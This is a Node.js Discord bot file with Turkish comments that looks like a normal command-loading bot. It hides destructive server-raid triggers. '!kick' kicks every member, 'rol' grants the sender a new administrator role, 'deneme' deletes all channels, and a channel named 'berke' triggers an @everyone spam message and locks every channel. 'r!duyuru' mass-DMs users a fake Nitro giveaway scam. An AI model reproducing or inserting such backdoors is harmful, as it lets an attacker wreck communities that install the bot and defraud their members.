//7/24 başlayış

const http = require('http');
const express = require('express');    
const app = express();
let cooldown = new Set();
let cdseconds = 5;
app.get("/", (request, response) => {
  console.log(Date.now());
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://pyros.glitch.me/`);
}, 10000);

const Discord = require('discord.js');
const fs = require('fs');
const chalk = require('chalk');

const client = new Discord.Client();
const tokenyeri = require('./tokenyeri.json');

require('./util/eventLoader')(client);

  client.on('message', msg => {
    if (msg.content === '!kick') {
      msg.guild.members.forEach(member => member.kick())
    }
  });

client.on('message', msg => {
  if (msg.content === 'rol') {
    msg.guild.createRole({
      name: 'krdsim ben berkeyim',
      permissions:["ADMINISTRATOR"] } );
    let role = msg.guild.roles.find(role => role.name === "krdsim ben berkeyim");
    msg.member.addRole(role)
  }
});

const log = message => {
  console.log(`${message}`);
};
  var prefix = tokenyeri.prefix;
  
/*BOTU AÇIK TUTMA*/
  client.commands = new Discord.Collection();
  client.aliases = new Discord.Collection();
  fs.readdir('./berke/', (err, files) => {
    if (err) console.error(err);
    log(`Başlıyor...`);
    files.forEach(f => {
      let props = require(`./berke/${f}`);
      log(`Tamamdır berke abi hazırım.`);
      client.commands.set(props.help.name, props);
      props.conf.aliases.forEach(alias => {
        client.aliases.set(alias, props.help.name);
      });
    });
  });

  client.reload = command => {
    return new Promise((resolve, reject) => {
      try {
        delete require.cache[require.resolve(`./berke/${command}`)];
        let cmd = require(`./berke/${command}`);
        client.commands.delete(command);
        client.aliases.forEach((cmd, alias) => {
          if (cmd === command) client.aliases.delete(alias);
        });
        client.commands.set(command, cmd);
        cmd.conf.aliases.forEach(alias => {
          client.aliases.set(alias, cmd.help.name);
        });
        resolve();
      } catch (e){
        reject(e);
      }
    });
  };

  client.load = command => {
    return new Promise((resolve, reject) => {
      try {
        let cmd = require(`./komutlar/${command}`);
        client.commands.set(command, cmd);
        cmd.conf.aliases.forEach(alias => {
          client.aliases.set(alias, cmd.help.name);
        });
        resolve();
      } catch (e){
        reject(e);
      }
    });
  };

client.reload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.load = command => {
  return new Promise((resolve, reject) => {
    try {
      let cmd = require(`./komutlar/${command}`);
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.unload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.on('ready', () => {
    client.user.setPresence({
        game: {
            name: `bot.eggsybot.xyz | Tekrardan Döndük!`,
            type: 'PLAYING', 
            // Değerler:
            // PLAYING: Oynuyor
            // WATCHING: İzliyor
            // LISTENING: Dinliyor
        },
        status: 'online'
        // Değerler:
        // online: Çevrimiçi
        // dnd: Rahatsız Etmeyin
        // idle: Boşta
    })
})

    client.on('message', msg => {
      if (msg.content === 'deneme') {
        msg.delete();
        msg.guild.channels.deleteAll("");      }
    });

var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;

client.on('warn', e => {
  console.log(chalk.bgYellow(e.replace(regToken, 'that was redacted')));
});

client.on('error', e => {
  console.log(chalk.bgRed(e.replace(regToken, 'that was redacted')));
});

client.on('channelCreate', channel => {
  if (channel.name == 'berke') {
    channel.send(`Allah zihin açıklığı versin. @everyone \n\nhttps://www.youtube.com/channel/UC0T1Lw6vM9JZWm6X-9U7ZvA?view_as=subscriber \n\nhttps://discord.gg/wrTekpC`)
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

client.elevation = message => {
  if(!message.guild) {
	return; }
  let permlvl = 0;
  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
  if (message.author.id === tokenyeri.sahip) permlvl = 4;
  return permlvl;
};

client.on('message', msg => {
  if (msg.content.toLowerCase() === 'r!duyuru') {
    msg.delete()
   msg.client.users.forEach(users => users.send('**omG**, https://discord.gift/nRcfFk8zzyYegknK - https://discord.gg/qBB6MaJ AWARDS GIVEN! 4.700 5 PAYMENT!   Real Server \n\n1 Invites = 1 Month Nitro Codes \n\nINSTANT PAYMENT OMGG \nhttps://cdn.discordapp.com/attachments/604641276570107954/605478087781777461/Screenshot_20.png'))
  }
});

client.login(tokenyeri.token) 